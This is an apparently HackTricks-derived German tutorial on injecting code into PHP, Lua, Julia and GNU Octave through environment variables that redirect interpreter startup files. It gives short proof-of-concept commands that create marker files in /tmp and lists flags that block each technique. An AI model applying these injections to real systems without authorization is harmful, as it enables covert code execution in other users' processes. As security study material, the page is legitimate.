# macOS-Injection über Interpreter-Startdateien

{{#include ../../../banners/hacktricks-training.md}}

Diese runtimespezifischen Techniken verwenden geerbte Umgebungsvariablen, um vor dem vorgesehenen Skript eine Startkonfiguration oder Code auszuwählen. Lua unterstützt außerdem eine Inline-Code-Variante.

## PHP-Startkonfiguration

### `PHPRC` / `PHP_INI_SCAN_DIR` und `auto_prepend_file`

PHP CLI und CGI lesen die Konfiguration bei jedem Aufruf ein. Mit `PHPRC` kann eine für den Angreifer lesbare `php.ini` ausgewählt werden, während `PHP_INI_SCAN_DIR` das Verzeichnis ändern kann, das nach zusätzlichen `.ini`-Dateien durchsucht wird. Die Direktive `auto_prepend_file` weist PHP an, eine Datei vor dem angeforderten Skript einzulesen. Diese Kombination ermöglicht daher die Ausführung von Code beim Start.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Eine Alternative ist ein Verzeichnis, das eine `.ini`-Datei enthält:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Die Option `-n` ignoriert `php.ini`; ein expliziter, vertrauenswürdiger `-c`-Pfad hat Vorrang vor `PHPRC`. Beachte, dass ein langlebiger Server-SAPI die Konfiguration normalerweise beim Start des Webservers einliest, während CLI und CGI dies bei jedem Aufruf tun.<sup>[[1]](#references)</sup>

## Lua-Startcode

### `LUA_INIT`

Bevor der eigenständige Lua-Interpreter Kommandozeilenoptionen oder das Zieldatei-Skript verarbeitet, führt er `LUA_INIT_<major>_<minor>` aus oder, falls die versionsspezifische Variable nicht gesetzt ist, `LUA_INIT`. Beginnt der Wert mit `@`, bezeichnet er eine Datei; andernfalls wird er direkt als Lua-Code ausgewertet. Dadurch ist die Ausführung beim Start sowohl dateibasiert als auch dateilos möglich.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Der genaue versionsabhängige Name ändert sich je nach Interpreter, zum Beispiel `LUA_INIT_5_4`. `lua -E` ignoriert alle Umgebungsvariablen, einschließlich Startup-Code und Lua-Modulpfaden.

## Julia-Startup-Depot

### `JULIA_DEPOT_PATH` und `startup.jl`

Julia führt beim Start normalerweise `config/startup.jl` aus dem ersten Depot aus. `JULIA_DEPOT_PATH` steuert die Depotliste. Wird der Pfad auf einen für den Angreifer lesbaren Verzeichnisbaum gesetzt, wird dadurch die automatisch geladene Startup-Datei umgeleitet.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Der abschließende Trenner ist nützlich, wenn das Opfer weiterhin seine normalen Pakete benötigt. `julia --startup-file=no` deaktiviert diese Startdatei. Löschen Sie die Variable vor dem Start, da sie auch Paketregistries, Umgebungen, Caches und Speicherorte zum Laden von Code steuert.

## GNU Octave-Startdateien

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave führt beim Start mehrere Dateien mit gültigen Octave-Befehlen aus. `OCTAVE_SITE_INITFILE` überschreibt die systemweite Startdatei und `OCTAVE_VERSION_INITFILE` die versionsspezifische Startdatei. Damit kann jede der beiden Variablen die automatische Ausführung auf eine für den Angreifer lesbare Datei umleiten.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` überspringt nur Benutzerdateien wie `~/.octaverc`; die obige Überschreibung der Site-Datei wird dadurch **nicht** verhindert. Verwende `--no-site-file` für die Site-Dateien oder `--norc` / `-f`, um alle Startdateien zu deaktivieren.<sup>[[7]](#references)</sup>

## References

- [1] [PHP-Konfigurationsdatei](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4-Standalone-Interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia-Kommandozeilenschnittstelle: Startdatei](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia-Umgebungsvariablen: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU-Octave-Startdateien](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU-Octave-Kommandozeilenoptionen](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
